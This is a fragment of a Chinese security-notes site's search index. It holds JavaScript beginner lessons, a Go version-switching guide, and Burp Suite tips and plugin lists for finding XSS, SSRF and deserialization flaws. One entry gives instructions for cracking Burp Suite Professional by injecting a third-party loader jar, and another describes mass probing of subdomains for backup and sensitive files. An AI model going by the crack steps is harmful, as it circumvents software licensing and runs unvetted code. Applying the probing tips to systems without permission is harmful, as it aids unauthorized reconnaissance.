"},"红蓝对抗/06.车联网安全/":{"url":"红蓝对抗/06.车联网安全/","title":"06.车联网安全","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/07.工控安全/":{"url":"红蓝对抗/07.工控安全/","title":"07.工控安全","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/":{"url":"红蓝对抗/08.基础技能相关/","title":"08.基础技能相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/01.Git笔记/":{"url":"红蓝对抗/08.基础技能相关/01.Git笔记/","title":"01.Git笔记","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/02.Vim笔记/":{"url":"红蓝对抗/08.基础技能相关/02.Vim笔记/","title":"02.Vim笔记","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/01.BurpSuit破解.html":{"url":"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/01.BurpSuit破解.html","title":"01.BurpSuit破解","keywords":"","body":"0x01下载官网包 https://portswigger.net/burp/releases/ 0x02下载loader https://raw.githubusercontent.com/x-Ai/BurpSuite/main/BurpSuiteLoader.jar SHA256: 1E54FBBAF3423C8B15B2507CB1E8C18092B0F728AA705EF8D235AC4300CD3E29 MD5: DEFAFC938A0344B188D7273D3DD3EB48 0x03破解流程 放置Loader至如下路径 /Applications/Burp Suite Professional.app/Contents/java/app 修改如下路径文件内容 /Applications/Burp Suite Professional.app/Contents/Info.plist 修改Info.plist文件，-Dexe4j.moduleName=$APP_PACKAGE 后插入如下语句 ...... -Dexe4j.moduleName=$APP_PACKAGE -noverify -javaagent:$APP_PACKAGE/Contents/Resources/app/BurpSuiteLoader.jar 使用启动台中的BurpSuite快捷方式即可享用 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-05 15:09:26 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/02.BurpSuit使用Tips.html":{"url":"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/02.BurpSuit使用Tips.html","title":"02.BurpSuit使用Tips","keywords":"","body":"BurpSuit使用技巧，欢迎享用 0x01 批量打POC 新版Burpsuite 2021.10的Indruder增加了配置Target的功能，也就是说现在发包的目标也可以作为Payload Position了，这直接给Burpsuite扩展出了批量打POC的能力。 比如我们可以收集一批子域名，用这个功能批量探测是否存在备份文件、敏感文件等。 0x02 Indruder限制返回头 另外分享个技巧，在Indruder跑结果的时候如果遇到返回包特别大导致Burpsuite很卡的情况，可以考虑在请求包里使用Range头来限制返回包的大小： Range: bytes=0-1024 原因是通常我们在扫描类似于备份文件这样的敏感文件时，我们只需要判断返回包的头是不是压缩包头即可，所以其实我们只需要拿到返回包的前N个字节即可，这样就可以避免遇到返回包很大占用大量内存的情况，也提高了扫描的速度。 这个技巧也是之前我在写XRay的目录扫描插件时使用的。 0x03 burp启动默认不走socks # Enter one VM parameter per line \\# For example, to adjust the maximum memory usage to 512 MB, uncomment the following line: \\# -Xmx512m \\# To include another file, uncomment the following line: \\# -include-options [path to other .vmoption file] -XX:MaxRAMPercentage=50 --illegal-access=permit -include-options user.vmoptions -Dhttp.proxyHost= -Dhttps.proxyHost= -DsocksProxyHost= -noverify -javaagent:burp-loader-x-Ai.jar 0x04 光标错位和中文显示 0x05 Burp流量处理 01 使用浏览器插件过滤噪声 02 对请求包进行非缓存的响应 可以通过在 Burp 的代理选项中启用强制所有响应非缓存，这样就可以看到操作后最新的版本： 03 请求格式转换 XML和json数据可以一键转换 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-08 10:33:51 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/03.BurpSuit插件.html":{"url":"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/03.BurpSuit插件.html","title":"03.BurpSuit插件","keywords":"","body":"我的BurpSuite食用方法 https://xz.aliyun.com/t/9690#toc-13 武装我的Burpsuite https://zone.huoxian.cn/d/823-burpsuite BurpSuite测试中一些常用tips https://xz.aliyun.com/t/11132 实战指南 https://t0data.gitbooks.io/burpsuite/content/chapter13.html 0x01 Reflector 下载地址:https://github.com/elkokc/reflector 通过设置Content-Type: text/html, 我们可以快速找到请求中的参数哪个被返回到回显的Body中，同时会进行一些特殊字符(etc)的探测, 以用来快速定位可疑的XSS漏洞。 0x02 DOMXSSHilight 下载地址:https://github.com/sechacking/DOMXSSHilight 这个主要是定位一些Dom的sink, 可以辅助手工去dig dom xss。 0x03 U2C v0.8 by bit4 下载地址:https://github.com/bit4woo/u2c 这个小工具还有非常有用的，用于转换返回包的unicode为中文，效果杠杠的。 0x04 Hack Bar 下载地址:https://github.com/d3vilbug/HackBar 集成了多种漏洞类型的一些payload，测试的时候可以非常方便地使用 0x05 BurpShiroPassiveScan https://github.com/pmiaowu/BurpShiroPassiveScan 被动扫描发现shiro，支持自定义key 0x06 FastJsonScan https://github.com/pmiaowu/BurpFastJsonScan 0x07 SSRF-King 下载地址:https://github.com/ethicalhackingplayground/ssrf-king 支持扫描和自动发现SSRF漏洞。 0x08 Autorize 下载地址: Bapp 里面就有 这个主要用于测试权限问题，可以自动发现不用授权的接口。 0x09 FastjsonScan 下载地址:https://github.com/zilong3033/fastjsonScan 这个插件算是比较全的检测fastjson的反序列化漏洞，这个检测机制是POST类型,且 Content-Type: application/json的请求。 0x10 Burp Bounty 下载地址:https://github.com/wagiro/BurpBounty 主要是提供可视化界面来代替花时间去写一些匹配关键字插件的功能，不过它的Pro版本有个功能叫smart scan，支持被动扫描+主动扫描，非pro版本不支持被动的时候直接去发包，但支持检测请求的时候的一些特征，比如我们有时候对一些方法需要重点关注下比如PUT方法的请求，还有就是一些敏感的端点也需要注意下，就可以用Burp Bounty来自定义profile做检测。 其实被动和主动，准确定义来说，被动应该是不会主动发包的，不过现在被动也可以理解成，被动获取到URL，然后对URL进行自动扫描。emmm。 profile参考: https://github.com/six2dez/burp-bounty-profiles 0x11 HaE 下载地址:https://github.com/gh0stkey/HaE 用于高亮特征和定位敏感信息,关于配置文件可以直接使用官方提供的:https://gh0st.cn/HaE/ 0x12 Log4jScan ppwu 支持自定义 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-08 16:04:50 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/01.Powershell/":{"url":"编程开发/01.Powershell/","title":"01.Powershell","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/02.Python/":{"url":"编程开发/02.Python/","title":"02.Python","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/03.Golang/":{"url":"编程开发/03.Golang/","title":"03.Golang","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/03.Golang/01.基础/01.Mac使用brew优雅切换Go版本.html":{"url":"编程开发/03.Golang/01.基础/01.Mac使用brew优雅切换Go版本.html","title":"01.Mac使用brew优雅切换Go版本","keywords":"","body":"0x01 升级brew brew update 0x02 解除当前版本绑定 brew unlink go 0x03 搜索可安装的go版本 brew search go 0x04 安装 brew install go@1.18 0x05 绑定版本关系 brew link go@1.18 0x06 刷新配置&验证 source ~/.zshrc go version Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-18 16:57:19 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/04.CandC++/":{"url":"编程开发/04.CandC++/","title":"04.CandC++","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/":{"url":"编程开发/05.JavaScript/","title":"05.JavaScript","keywords":"","body":"学余弦的web前端安全的时候学了几天JavaScript，但是就放下了，Web3.0已来，学起来 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-10 23:46:06 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/01快速入门/01基本语法.html":{"url":"编程开发/05.JavaScript/01快速入门/01基本语法.html","title":"01基本语法","keywords":"","body":"语法 JavaScript，每个语句使用;结束，语块使用{.....}。浏览器会自动补全语句分号，但是语义可能会出现问题。 注释 //行注释 /*...*/块注释 示例 if (2 > 1) { x = 1; y = 2; z = 3; if (x y) { z = 5; } } // 这是一行注释 alert('hello'); // 这也是注释 /* 从这里开始是块注释 仍然是注释 仍然是注释 注释结束 */ Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 22:54:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/01快速入门/02数据类型和变量.html":{"url":"编程开发/05.JavaScript/01快速入门/02数据类型和变量.html","title":"02数据类型和变量","keywords":"","body":"0x01 Number JavaScript不区分整数和浮点数，统一用Number表示 123; // 整数123 0.456; // 浮点数0.456 1.2345e3; // 科学计数法表示1.2345x1000，等同于1234.5 -99; // 负数 NaN; // NaN表示Not a Number，当无法计算结果时用NaN表示 Infinity; // Infinity表示无限大，当数值超过了JavaScript的Number所能表示的最大值时，就表示为Infinity 对计算机来说十六进制更友好，例如：0xff00，0xa5b4c3d2，等等，它们和十进制表示的数值完全一样。 Number可以进行四则运算，规则和数学一样。 1 + 2; // 3 (1 + 2) * 5 / 2; // 7.5 2 / 0; // Infinity 0 / 0; // NaN 10 % 3; // 1 10.5 % 3; // 1.5 0x02 字符串 单引号或双引号括起来的任意文本。 0x03 布尔值 布尔值和布尔代数的表示完全一致，一个布尔值只有true、false两种值。 true; // 这是一个true值 false; // 这是一个false值 2 > 1; // 这是一个true值 2 >= 3; // 这是一个false值 &&运算是与运算，只有所有都为true，&&运算结果才是true： true && true; // 这个&&语句计算结果为true true && false; // 这个&&语句计算结果为false false && true && false; // 这个&&语句计算结果为false ||运算是或运算，只要其中有一个为true，||运算结果就是true： false || false; // 这个||语句计算结果为false true || false; // 这个||语句计算结果为true false || true || false; // 这个||语句计算结果为true !运算是非运算，它是一个单目运算符，把true变成false，false变成true： ! true; // 结果为false ! false; // 结果为true ! (2 > 5); // 结果为true 布尔值通常在条件判断中使用。 0x04 比较运算符 JavaScript允许对任意数据类型做比较： false == 0; // true false === 0; // false JavaScript在设计时有两种比较运算符 第一种是==比较，它会自动转换数据类型再比较，很多时候，会得到非常诡异的结果； 第二种是===比较，它不会自动转换数据类型，如果数据类型不一致，返回false，如果一致，再比较。 建议坚持使用 === 来进行比较。 另一个例外是NaN这个特殊的Number与所有其他值都不相等，包括它自己： NaN === NaN; // false 唯一能判断NaN的方法是通过isNaN()函数： isNaN(NaN); // true 最后要注意浮点数的相等比较： 1 / 3 === (1 - 2 / 3); // false 浮点数在运算过程中会产生误差，因为计算机无法精确表示无限循环小数。要比较两个浮点数是否相等，只能计算它们之差的绝对值，看是否小于某个阈值： Math.abs(1 / 3 - (1 - 2 / 3)) 0x05 null和undefined null表示一个“空”的值，它和0以及空字符串''不同，0是一个数值，''表示长度为0的字符串，而null表示“空”。 JavaScript的设计者希望用null表示一个空的值，而undefined表示值未定义。事实证明，这并没有什么卵用，区分两者的意义不大。大多数情况下，我们都应该用null。undefined仅仅在判断函数参数是否传递的情况下有用。 0x06 数组 JavaScript的数组可以包括任意数据类型的元素。 [1, 2, 3.14, 'Hello', null, true]; 上述数组包含6个元素。数组用[]表示，元素之间用,分隔。 可以通过Array()函数实现： new Array(1, 2, 3); // 创建了数组[1, 2, 3] 推荐使用第一种方法定义数组。 数组的元素可以通过索引来访问。请注意，索引的起始值为0： var arr = [1, 2, 3.14, 'Hello', null, true]; arr[0]; // 返回索引为0的元素，即1 arr[5]; // 返回索引为5的元素，即true arr[6]; // 索引超出了范围，返回undefined 0x07 对象 JavaScript的对象是一组由键-值组成的无序集合： var person = { name: 'Bob', age: 20, tags: ['js', 'web', 'mobile'], city: 'Beijing', hasCar: true, zipcode: null }; JavaScript对象的键都是字符串类型，值可以是任意数据类型。上述person对象一共定义了6个键值对，其中每个键又称为对象的属性，例如，person的name属性为'Bob'，zipcode属性为null。 获取对象的属性使用 对象变量.属性名的方式 person.name; // 'Bob' person.zipcode; // null 0x10 变量 变量可以使任意数据类型 变量在JavaScript中就是用一个变量名表示，变量名是大小写英文、数字、$和_的组合，且不能用数字开头。变量名也不能是JavaScript的关键字，如if、while等。申明一个变量用var语句，比如： var a; // 申明了变量a，此时a的值为undefined var $b = 1; // 申明了变量$b，同时给$b赋值，此时$b的值为1 var s_007 = '007'; // s_007是一个字符串 var Answer = true; // Answer是一个布尔值true var t = null; // t的值是null 在JavaScript中，使用等号=对变量进行赋值。可以把任意数据类型赋值给变量，同一个变量可以反复赋值，而且可以是不同类型的变量，但是要注意只能用var申明一次，（动态语言的特性）例如： var a = 123; // a的值是整数123 a = 'ABC'; // a变为字符串 （和Java不同，Java是静态语言） 0x11 Strict模式 如果一个变量没有通过var申明就被使用，那么该变量就自动被申明为全局变量： i = 10; // i现在是全局变量 使用var申明的变量则不是全局变量，它的范围被限制在该变量被申明的函数体内（函数的概念将稍后讲解），同名变量在不同的函数体内互不冲突。 为了修补JavaScript这一严重设计缺陷，ECMA在后续规范中推出了strict模式，在strict模式下运行的JavaScript代码，强制通过var申明变量，未使用var申明变量就使用的，将导致运行错误。 启用strict模式的方法是在JavaScript代码的第一行写上： 'use strict'; 控制台上运行的每一个语句都是一个block，而在一个单独的block中，'use strict'才有效 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 22:54:47 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/01快速入门/03字符串.html":{"url":"编程开发/05.JavaScript/01快速入门/03字符串.html","title":"03字符串","keywords":"","body":"JavaScript的字符串就是用''或\"\"括起来的字符表示 0x01 字符串的形式 转义字符\\可以转义很多字符，比如\\n表示换行，\\t表示制表符，字符\\本身也要转义，所以\\\\表示的字符就是\\。 ASCII字符可以以\\x##形式的十六进制表示，例如： '\\x41'; // 完全等同于 'A' 用\\u####表示一个Unicode字符： '\\u4e2d\\u6587'; // 完全等同于 '中文' 0x02 多行字符串 最新的ES6标准新增了一种多行字符串的表示方法，用反引号...表示： `这是一个 多行 字符串`; 0x03 模板字符串 要把多个字符串连接起来，可以用+号连接： var name = '小明'; var age = 20; var message = '你好, ' + name + ', 你今年' + age + '岁了!'; alert(message); ES6新增了一种模板字符串，表示方法和上面的多行字符串一样，但是它会自动替换字符串中的变量： var name = '小明'; var age = 20; var message = `你好, ${name}, 你今年${age}岁了!`; alert(message); 0x04 操作字符串 获取字符串的长度 var s = 'Hello, world!'; s.length; // 13 获取字符串某个指定位置的字符 var s = 'Hello, world!'; s[0]; // 'H' s[6]; // ' ' s[7]; // 'w' s[12]; // '!' s[13]; // undefined 超出范围的索引不会报错，但一律返回undefined 需要特别注意的是，字符串是不可变的，如果对字符串的某个索引赋值，不会有任何错误，但是，也没有任何效果 var s = 'Test'; s[0] = 'X'; alert(s); // s仍然为'Test' JavaScript为字符串提供了一些常用方法，注意，调用这些方法本身不会改变原有字符串的内容，而是返回一个新字符串： toUpperCase 字符串全部变成大写 var s = 'Hello'; s.toUpperCase(); // 返回'HELLO' toLowerCase 字符串全部变成小写 var s = 'Hello'; var lower = s.toLowerCase(); // 返回'hello'并赋值给变量lower lower; // 'hello' indexOf 搜索字符串出现的位置 var s = 'hello, world'; s.indexOf('world'); // 返回7 s.indexOf('World'); // 没有找到指定的子串，返回-1 substring 返回指定索引区间的字符串 var s = 'hello, world' s.substring(0, 5); // 从索引0开始到5（不包括5），返回'hello' s.substring(7); // 从索引7开始到结束，返回'world' Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 22:54:58 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/01快速入门/04数组.html":{"url":"编程开发/05.JavaScript/01快速入门/04数组.html","title":"04数组","keywords":"","body":"0x01 和其他语言数组的特性 JavaScript的Array可以包含任意数据类型，并通过索引来访问每个元素。JavaScript的Array可以包含任意数据类型，并通过索引来访问每个元素。 大多数其他编程语言不允许直接改变数组的大小，越界访问索引会报错。然而，JavaScript的Array却不会有任何错误。在编写代码时，不建议直接修改Array的大小，访问索引时要确保索引不会越界。 var arr = [1, 2, 3.14, 'Hello', null, true]; arr.length; // 6 直接给Array的length赋一个新的值会导致Array大小的变化： var arr = [1, 2, 3]; arr.length; // 3 arr.length = 6; arr; // arr变为[1, 2, 3, undefined, undefined, undefined] arr.length = 2; arr; // arr变为[1, 2] Array可以通过索引把对应的元素修改为新的值，因此，对Array的索引进行赋值会直接修改这个Array： var arr = ['A', 'B', 'C']; arr[1] = 99; arr; // arr现在变为['A', 99, 'C'] 如果通过索引赋值时，索引超过了范围，同样会引起Array大小的变化： var arr = [1, 2, 3]; arr[5] = 'x'; arr; // arr变为[1, 2, 3, undefined, undefined, 'x'] 0x02 数组的常用方法 01 indexOf 与String类似，Array也可以通过indexOf()来搜索一个指定的元素的位置： var arr = [10, 20, '30', 'xyz']; arr.indexOf(10); // 元素10的索引为0 arr.indexOf(20); // 元素20的索引为1 arr.indexOf(30); // 元素30没有找到，返回-1 arr.indexOf('30'); // 元素'30'的索引为2 注意了，数字30和字符串'30'是不同的元素 02 slice slice()就是对应String的substring()版本，它截取Array的部分元素，然后返回一个新的Array： var arr = ['A', 'B', 'C', 'D', 'E', 'F', 'G']; arr.slice(0, 3); // 从索引0开始，到索引3结束，但不包括索引3: ['A', 'B', 'C'] arr.slice(3); // 从索引3开始到结束: ['D', 'E', 'F', 'G'] 如果不给slice()传递任何参数，它就会从头到尾截取所有元素。利用这一点，我们可以很容易地复制一个Array： var arr = ['A', 'B', 'C', 'D', 'E', 'F', 'G']; var aCopy = arr.slice(); aCopy; // ['A', 'B', 'C', 'D', 'E', 'F', 'G'] aCopy === arr; // false 03 push和pop push()向Array的末尾添加若干元素，pop()则把Array的最后一个元素删除掉： var arr = [1, 2]; arr.push('A', 'B'); // 返回Array新的长度: 4 arr; // [1, 2, 'A', 'B'] arr.pop(); // pop()返回'B' arr; // [1, 2, 'A'] arr.pop(); arr.pop(); arr.pop(); // 连续pop 3次 arr; // [] arr.pop(); // 空数组继续pop不会报错，而是返回undefined arr; // [] 04 unshift和shift 如果要往Array的头部添加若干元素，使用unshift()方法，shift()方法则把Array的第一个元素删掉： var arr = [1, 2]; arr.unshift('A', 'B'); // 返回Array新的长度: 4 arr; // ['A', 'B', 1, 2] arr.shift(); // 'A' arr; // ['B', 1, 2] arr.shift(); arr.shift(); arr.shift(); // 连续shift 3次 arr; // [] arr.shift(); // 空数组继续shift不会报错，而是返回undefined arr; // [] 05 sort sort()可以对当前Array进行排序，它会直接修改当前Array的元素位置，直接调用时，按照默认顺序排序： var arr = ['B', 'C', 'A']; arr.sort(); arr; // ['A', 'B', 'C'] 06 reverse reverse()把整个Array的元素给调个个，也就是反转： var arr = ['one', 'two', 'three']; arr.reverse(); arr; // ['three', 'two', 'one'] 07 splice splice()方法是修改Array的“万能方法”，它可以从指定的索引开始删除若干元素，然后再从该位置添加若干元素： var arr = ['Microsoft', 'Apple', 'Yahoo', 'AOL', 'Excite', 'Oracle']; // 从索引2开始删除3个元素,然后再添加两个元素: arr.splice(2, 3, 'Google', 'Facebook'); // 返回删除的元素 ['Yahoo', 'AOL', 'Excite'] arr; // ['Microsoft', 'Apple', 'Google', 'Facebook', 'Oracle'] // 只删除,不添加: arr.splice(2, 2); // ['Google', 'Facebook'] arr; // ['Microsoft', 'Apple', 'Oracle'] // 只添加,不删除: arr.splice(2, 0, 'Google', 'Facebook'); // 返回[],因为没有删除任何元素 arr; // ['Microsoft', 'Apple', 'Google', 'Facebook', 'Oracle'] 08 concat concat()方法把当前的Array和另一个Array连接起来，并返回一个新的Array： var arr = ['A', 'B', 'C']; var added = arr.concat([1, 2, 3]); added; // ['A', 'B', 'C', 1, 2, 3] arr; // ['A', 'B', 'C'] 请注意，concat()方法并没有修改当前Array，而是返回了一个新的Array。 实际上，concat()方法可以接收任意个元素和Array，并且自动把Array拆开，然后全部添加到新的Array里： var arr = ['A', 'B', 'C']; arr.concat(1, 2, [3, 4]); // ['A', 'B', 'C', 1, 2, 3, 4] 09 join join()方法是一个非常实用的方法，它把当前Array的每个元素都用指定的字符串连接起来，然后返回连接后的字符串： var arr = ['A', 'B', 'C', 1, 2, 3]; arr.join('-'); // 'A-B-C-1-2-3' 如果Array的元素不是字符串，将自动转换为字符串后再连接。 0x03 多维数组 如果数组的某个元素又是一个Array，则可以形成多维数组，例如： var arr = [[1, 2, 3], [400, 500, 600], '-']; Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 22:55:03 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/01快速入门/05对象.html":{"url":"编程开发/05.JavaScript/01快速入门/05对象.html","title":"05对象","keywords":"","body":"JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。 JavaScript用一个{...}表示一个对象，键值对以xxx: xxx形式申明，用,隔开。注意，最后一个键值对不需要在末尾加,，如果加了，有的浏览器（如低版本的IE）将报错。 对象的申明 var xiaoming = { name: '小明', birth: 1990, school: 'No.1 Middle School', height: 1.70, weight: 65, score: null }; 上述对象申明了一个name属性，值是'小明'，birth属性，值是1990，以及其他一些属性。最后，把这个对象赋值给变量xiaoming后，就可以通过变量xiaoming来获取小明的属性 对象属性的调用1 xiaoming.name; // '小明' xiaoming.birth; // 1990 访问属性是通过.操作符完成的，但这要求属性名必须是一个有效的变量名。如果属性名包含特殊字符，就必须用''括起来： var xiaohong = { name: '小红', 'middle-school': 'No.1 Middle School' }; xiaohong的属性名middle-school不是一个有效的变量，就需要用''括起来。访问这个属性也无法使用.操作符，必须用['xxx']来访问： 对象属性的调用2 xiaohong['middle-school']; // 'No.1 Middle School' xiaohong['name']; // '小红' xiaohong.name; // '小红' 也可以用xiaohong['name']来访问xiaohong的name属性，不过xiaohong.name的写法更简洁。我们在编写JavaScript代码的时候，属性名尽量使用标准的变量名，这样就可以直接通过object.prop的形式访问一个属性了。 如果访问一个不存在的属性会返回什么呢？JavaScript规定，访问不存在的属性不报错，而是返回undefined： 动态为对象添加或者删除属性 var xiaoming = { name: '小明' }; xiaoming.age; // undefined xiaoming.age = 18; // 新增一个age属性 xiaoming.age; // 18 delete xiaoming.age; // 删除age属性 xiaoming.age; // undefined delete xiaoming['name']; // 删除name属性 xiaoming.name; // undefined delete xiaoming.school; // 删除一个不存在的school属性也不会报错 判断对象是否拥有某个属性 var xiaoming = { name: '小明', birth: 1990, school: 'No.1 Middle School', height: 1.70, weight: 65, score: null }; 'name' in xiaoming; // true 'grade' in xiaoming; // false 不过要小心，如果in判断一个属性存在，这个属性不一定是xiaoming的，它可能是xiaoming继承得到的： 'toString' in xiaoming; // true 因为toString定义在object对象中，而所有对象最终都会在原型链上指向object，所以xiaoming也拥有toString属性。 要判断一个属性是否是xiaoming自身拥有的，而不是继承得到的，可以用hasOwnProperty()方法： hasOwnProperty var xiaoming = { name: '小明' }; xiaoming.hasOwnProperty('name'); // true xiaoming.hasOwnProperty('toString'); // false Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 23:06:41 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "}}